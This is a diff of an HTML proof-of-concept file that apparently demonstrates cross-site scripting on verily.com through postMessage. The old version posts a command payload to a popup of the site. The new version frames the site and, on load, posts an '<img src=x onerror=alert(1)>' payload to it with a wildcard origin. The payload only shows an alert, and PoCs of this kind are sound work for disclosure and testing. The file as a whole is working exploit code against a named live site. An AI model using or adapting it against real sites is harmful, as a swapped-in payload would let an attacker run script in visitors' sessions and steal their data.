@@ -1,31 +1,17 @@
+<!-- verily-xss-poc.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>PoC: XSS via postMessage (verily.com)</title>
-</head>
-<body>
-  <h2>✅ Click below to launch PoC window</h2>
-  <button onclick="sendExploit()">🚀 Launch Exploit</button>
-
-  <script>
-    function sendExploit() {
-      const payload = {
-        cmd: "run",
-        payload: "alert(1)"
+  <body>
+    <iframe id="victim" src="https://verily.com/" width="800" height="600"></iframe>
+    <script>
+      const iframe = document.getElementById("victim");
+      iframe.onload = () => {
+        console.log("✅ iframe loaded");
+        iframe.contentWindow.postMessage({
+          html: "<img src=x onerror=alert(1)>",
+        }, "*");
+        console.log("🚀 XSS payload sent via postMessage");
       };
-
-      const win = window.open("https://verily.com", "_blank");
-      if (!win) {
-        alert("Popup blocked!");
-        return;
-      }
-
-      setTimeout(() => {
-        win.postMessage(payload, "*");
-        console.log("🚀 Payload sent via postMessage");
-      }, 3000);
-    }
-  </script>
-</body>
+    </script>
+  </body>
 </html>
